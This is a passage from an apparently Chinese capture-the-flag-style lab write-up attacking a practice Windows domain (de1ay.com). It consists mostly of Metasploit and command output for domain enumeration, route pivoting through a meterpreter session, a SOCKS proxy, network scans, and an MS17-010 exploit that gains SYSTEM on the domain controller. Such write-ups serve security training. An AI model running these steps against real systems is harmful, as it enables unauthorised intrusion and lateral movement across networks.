+        NetBT_Tcpip_<span class="token punctuation">{</span>D7E14072-49B9-45D3-BA8C-7955E6146CC2<span class="token punctuation">}</span> <span class="token punctuation">(</span>000C295A92F5<span class="token punctuation">)</span>
+        NetBT_Tcpip_<span class="token punctuation">{</span>AD80CD23-D97F-4814-A715-9248D845EA0F<span class="token punctuation">}</span> <span class="token punctuation">(</span>000C295A92FF<span class="token punctuation">)</span>
+
+Software version                     Windows Server <span class="token number">2008</span> R2 Standard
+
+Workstation domain                   DE1AY
+Workstation Domain DNS Name          de1ay.com
+Logon domain                         WEB
+
+COM Open Timeout <span class="token punctuation">(</span>sec<span class="token punctuation">)</span>               <span class="token number">0</span>
+COM Send Count <span class="token punctuation">(</span>byte<span class="token punctuation">)</span>                <span class="token number">32</span>
+COM Send Timeout <span class="token punctuation">(</span>msec<span class="token punctuation">)</span>              <span class="token number">250</span>
+The <span class="token builtin class-name">command</span> completed successfully.
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>域内用户组</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C:<span class="token punctuation">\</span><span class="token operator">&gt;</span>net group /domain
+net group /domain
+The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.
+
+
+Group Accounts <span class="token keyword">for</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>DC.de1ay.com
+
+-------------------------------------------------------------------------------
+*Cloneable Domain Controllers
+*DnsUpdateProxy
+*Domain Admins
+*Domain Computers
+*Domain Controllers
+*Domain Guests
+*Domain Users
+*Enterprise Admins
+*Enterprise Read-only Domain Controllers
+*Group Policy Creator Owners
+*Protected Users
+*Read-only Domain Controllers
+*Schema Admins
+The <span class="token builtin class-name">command</span> completed successfully.
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>域用户</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C:<span class="token punctuation">\</span><span class="token operator">&gt;</span>net user /domain
+net user /domain
+The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.
+
+
+User accounts <span class="token keyword">for</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>DC.de1ay.com
+
+-------------------------------------------------------------------------------
+Administrator            de1ay                    Guest                    
+krbtgt                   mssql                    
+The <span class="token builtin class-name">command</span> completed successfully.
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>域内机器</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C:<span class="token punctuation">\</span><span class="token operator">&gt;</span>net group <span class="token string">&quot;domain computers&quot;</span> /domain
+net group <span class="token string">&quot;domain computers&quot;</span> /domain
+The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.
+
+Group name     Domain Computers
+Comment        ���뵽���е����й���վ�ͷ�����
+
+Members
+
+-------------------------------------------------------------------------------
+PC$                      WEB$                     
+The <span class="token builtin class-name">command</span> completed successfully.
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><blockquote><p>PC</p> <p>WEB</p></blockquote> <p>域控</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C:<span class="token punctuation">\</span><span class="token operator">&gt;</span>net group <span class="token string">&quot;domain controllers&quot;</span> /domain
+net group <span class="token string">&quot;domain controllers&quot;</span> /domain
+The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.
+
+Group name     Domain Controllers
+Comment        ����������������
+
+Members
+
+-------------------------------------------------------------------------------
+DC$                      
+The <span class="token builtin class-name">command</span> completed successfully.
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><blockquote><p>DC</p></blockquote> <h3 id="横向移动"><a href="#横向移动" class="header-anchor">#</a> 横向移动</h3> <h4 id="设置代理"><a href="#设置代理" class="header-anchor">#</a> 设置代理</h4> <blockquote><p>确保已在 MSF 中 get shell</p></blockquote> <p>添加路由</p> <blockquote><p>手工添加：run autoroute -s 192.168.52.0/24		#添加路由
+run autoroute -p									#查看路由
+自动添加：run post/multi/manage/autoroute</p></blockquote> <blockquote><p>查看路由表：run autoroute -p</p></blockquote> <p>自动添加失败：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>meterpreter <span class="token operator">&gt;</span> run post/multi/manage/autoroute
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token environment constant">SESSION</span> may not be compatible with this module:
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span>  * incompatible session platform: windows
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running module against WEB
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Searching <span class="token keyword">for</span> subnets to autoroute.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Did not <span class="token function">find</span> any new subnets to add.
+meterpreter <span class="token operator">&gt;</span> run autoroute -p
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No routes have been added yet
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>手动添加</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>meterpreter <span class="token operator">&gt;</span> run autoroute -s <span class="token number">10.10</span>.10.0/24
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Adding a route to <span class="token number">10.10</span>.10.0/255.255.255.0<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Added route to <span class="token number">10.10</span>.10.0/255.255.255.0 via <span class="token number">192.168</span>.111.80
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Use the -p option to list all active routes
+meterpreter <span class="token operator">&gt;</span> run autoroute -p
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+
+Active Routing Table
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   <span class="token number">10.10</span>.10.0         <span class="token number">255.255</span>.255.0      Session <span class="token number">1</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>设置代理</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>meterpreter <span class="token operator">&gt;</span> background 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Backgrounding session <span class="token number">1</span><span class="token punctuation">..</span>.
+msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/server/socks_proxy
+msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 
+
+Module options <span class="token punctuation">(</span>auxiliary/server/socks_proxy<span class="token punctuation">)</span>:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password <span class="token keyword">for</span> SOCKS5 listener
+   SRVHOST   <span class="token number">0.0</span>.0.0          <span class="token function">yes</span>       The address to listen on
+   SRVPORT   <span class="token number">1080</span>             <span class="token function">yes</span>       The port to listen on
+   USERNAME                   no        Proxy username <span class="token keyword">for</span> SOCKS5 listener
+   VERSION   <span class="token number">5</span>                <span class="token function">yes</span>       The SOCKS version to use <span class="token punctuation">(</span>Accepted: 4a, <span class="token number">5</span><span class="token punctuation">)</span>
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> srvhost <span class="token number">127.0</span>.0.1
+srvhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">127.0</span>.0.1
+msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job <span class="token number">0</span>.
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the SOCKS proxy server
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><p>发现设置的代理无法使用，重启了下代理，直接起不来了。。。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job <span class="token number">259</span>.
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the SOCKS proxy server
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopping the SOCKS proxy server
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>重来一次，好了：（换了个Payload：<code>windows/meterpreter/reverse_tcp</code>）</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; run post/multi/manage/autoroute
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[*] Running module against WEB
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.10.10.0/255.255.255.0 from host's routing table.
+[+] Route added to subnet 192.168.111.0/255.255.255.0 from host's routing table.
+
+meterpreter &gt; run autoroute -p
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.10.10.0         255.255.255.0      Session 1
+   192.168.111.0      255.255.255.0      Session 1
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h4 id="arp扫一下"><a href="#arp扫一下" class="header-anchor">#</a> ARP扫一下</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>meterpreter <span class="token operator">&gt;</span> run post/windows/gather/arp_scanner <span class="token assign-left variable">RHOSTS</span><span class="token operator">=</span><span class="token number">10.10</span>.10.0/24
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running module against WEB
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ARP Scanning <span class="token number">10.10</span>.10.0/24
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.10 MAC 00:0c:29:38:c3:bc <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.80 MAC 00:0c:29:5a:92:ff <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.201 MAC 00:0c:29:71:5d:13 <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.255 MAC 00:0c:29:5a:92:ff <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.254 MAC 00:50:56:fa:a2:7c <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="存活主机扫描"><a href="#存活主机扫描" class="header-anchor">#</a> 存活主机扫描</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/netbios/nbname
+msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 
+
+Module options <span class="token punctuation">(</span>auxiliary/scanner/netbios/nbname<span class="token punctuation">)</span>:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  <span class="token number">256</span>              <span class="token function">yes</span>       The number of hosts to probe <span class="token keyword">in</span> each <span class="token builtin class-name">set</span>
+   RHOSTS                      <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo
+                                         it
+   RPORT      <span class="token number">137</span>              <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>UDP<span class="token punctuation">)</span>
+   THREADS    <span class="token number">10</span>               <span class="token function">yes</span>       The number of concurrent threads
+
+msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.0/24
+rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">10.10</span>.10.0/24
+msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending NetBIOS requests to <span class="token number">10.10</span>.10.0-<span class="token operator">&gt;</span><span class="token number">10.10</span>.10.255 <span class="token punctuation">(</span><span class="token number">256</span> hosts<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10 <span class="token punctuation">[</span>DC<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>DC, DE1AY<span class="token punctuation">)</span> Addresses:<span class="token punctuation">(</span><span class="token number">10.10</span>.10.10<span class="token punctuation">)</span> Mac:00:0c:29:38:c3:bc Virtual Machine:VMWare
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.80 <span class="token punctuation">[</span>WEB<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>WEB, DE1AY<span class="token punctuation">)</span>  Mac:00:0c:29:5a:92:ff Virtual Machine:VMWare
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><blockquote><p>少了一台 201。</p> <p>DC 10.10.10.10</p></blockquote> <h4 id="nmap扫描"><a href="#nmap扫描" class="header-anchor">#</a> nmap扫描</h4> <div class="language- line-numbers-mode"><pre class="language-text"><code>proxychains4 nmap -p 1-1000 -Pn -sT [IP_address]
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>DC：</p> <p><img src="/assets/img/image-20220909000002317.7e04af00.png" alt="image-20220909000002317"></p> <p>201：</p> <p><img src="/assets/img/image-20220909000024118.076f1694.png" alt="image-20220909000024118"></p> <blockquote><p>都开了445，看看版本号</p></blockquote> <h4 id="查版本号"><a href="#查版本号" class="header-anchor">#</a> 查版本号</h4> <div class="language- line-numbers-mode"><pre class="language-text"><code>msf6 auxiliary(server/socks_proxy) &gt; use auxiliary/scanner/smb/smb_version 
+msf6 auxiliary(scanner/smb/smb_version) &gt; options 
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/smb/smb_version) &gt; set rhosts 10.10.10.201
+rhosts =&gt; 10.10.10.201
+msf6 auxiliary(scanner/smb/smb_version) &gt; run
+
+[*] 10.10.10.201:445      - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:3d 8h 33m 53s) (guid:{7c9d6895-d9a9-4cfa-b238-a99d5aec207c}) (authentication domain:DE1AY)
+[+] 10.10.10.201:445      -   Host is running Windows 7 Ultimate SP1 (build:7601) (name:PC) (domain:DE1AY)
+[*] 10.10.10.201:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_version) &gt; set rhosts 10.10.10.10
+rhosts =&gt; 10.10.10.10
+msf6 auxiliary(scanner/smb/smb_version) &gt; run
+
+[*] 10.10.10.10:445       - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:6h 31m 35s) (guid:{5058d13b-deb5-4f11-b8ba-8cf79f7275f1}) (authentication domain:DE1AY)
+[+] 10.10.10.10:445       -   Host is running Windows 2012 R2 Standard (build:9600) (name:DC) (domain:DE1AY)
+[*] 10.10.10.10:          - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><blockquote><p>201 PC: Win7</p> <p>10 DC: Win S 2012 R2</p></blockquote> <h4 id="ms17-010"><a href="#ms17-010" class="header-anchor">#</a> MS17_010</h4> <p>上面两台均可利用入侵，以DC为例：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/admin/smb/ms17_010_command
+msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 
+
+Module options <span class="token punctuation">(</span>auxiliary/admin/smb/ms17_010_command<span class="token punctuation">)</span>:
+
+   Name                  Current Setting                     Required  Description
+   ----                  ---------------                     --------  -----------
+   COMMAND               net group <span class="token string">&quot;Domain Admins&quot;</span> /domain   <span class="token function">yes</span>       The <span class="token builtin class-name">command</span> you want to execute on the remote <span class="token function">host</span>
+   DBGTRACE              <span class="token boolean">false</span>                               <span class="token function">yes</span>       Show extra debug trace info
+   LEAKATTEMPTS          <span class="token number">99</span>                                  <span class="token function">yes</span>       How many <span class="token builtin class-name">times</span> to try to leak transaction
+   NAMEDPIPE                                                 no        A named pipe that can be connected to <span class="token punctuation">(</span>leave blank <span class="token keyword">for</span> auto<span class="token punctuation">)</span>
+   NAMED_PIPES           /usr/share/metasploit-framework/da  <span class="token function">yes</span>       List of named pipes to check
+                         ta/wordlists/named_pipes.txt
+   RHOSTS                                                    <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit
+                                                                       -framework/wiki/Using-Metasploit
+   RPORT                 <span class="token number">445</span>                                 <span class="token function">yes</span>       The Target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
+   SERVICE_DESCRIPTION                                       no        Service description to to be used on target <span class="token keyword">for</span> pretty listi
+                                                                       ng
+   SERVICE_DISPLAY_NAME                                      no        The <span class="token function">service</span> display name
+   SERVICE_NAME                                              no        The <span class="token function">service</span> name
+   SMBDomain             <span class="token builtin class-name">.</span>                                   no        The Windows domain to use <span class="token keyword">for</span> authentication
+   SMBPass                                                   no        The password <span class="token keyword">for</span> the specified username
+   SMBSHARE              C$                                  <span class="token function">yes</span>       The name of a writeable share on the server
+   SMBUser                                                   no        The username to authenticate as
+   THREADS               <span class="token number">1</span>                                   <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per <span class="token function">host</span><span class="token punctuation">)</span>
+   WINPATH               WINDOWS                             <span class="token function">yes</span>       The name of the remote Windows directory
+
+msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> <span class="token builtin class-name">command</span> <span class="token string">&quot;ipconfig&quot;</span>
+<span class="token builtin class-name">command</span> <span class="token operator">=</span><span class="token operator">&gt;</span> ipconfig
+msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.10
+rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">10.10</span>.10.10
+msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Target OS: Windows Server <span class="token number">2012</span> R2 Standard <span class="token number">9600</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Built a write-what-where primitive<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Overwrite complete<span class="token punctuation">..</span>. SYSTEM session obtained<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Service start timed out, OK <span class="token keyword">if</span> running a <span class="token builtin class-name">command</span> or non-service executable<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Getting the <span class="token builtin class-name">command</span> output<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Executing cleanup<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Cleanup was successful
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Command completed successfully<span class="token operator">!</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Output <span class="token keyword">for</span> <span class="token string">&quot;ipconfig&quot;</span><span class="token builtin class-name">:</span>
+
+
+Windows IP ����
+
+
+���������� Ethernet0:
+
+   �����ض��� DNS ��׺ <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> 
+   �������� IPv6 ��. <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> fe80::fa:a5d5:4ccb:b522%12
+   IPv4 �� <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">10.10</span>.10.10
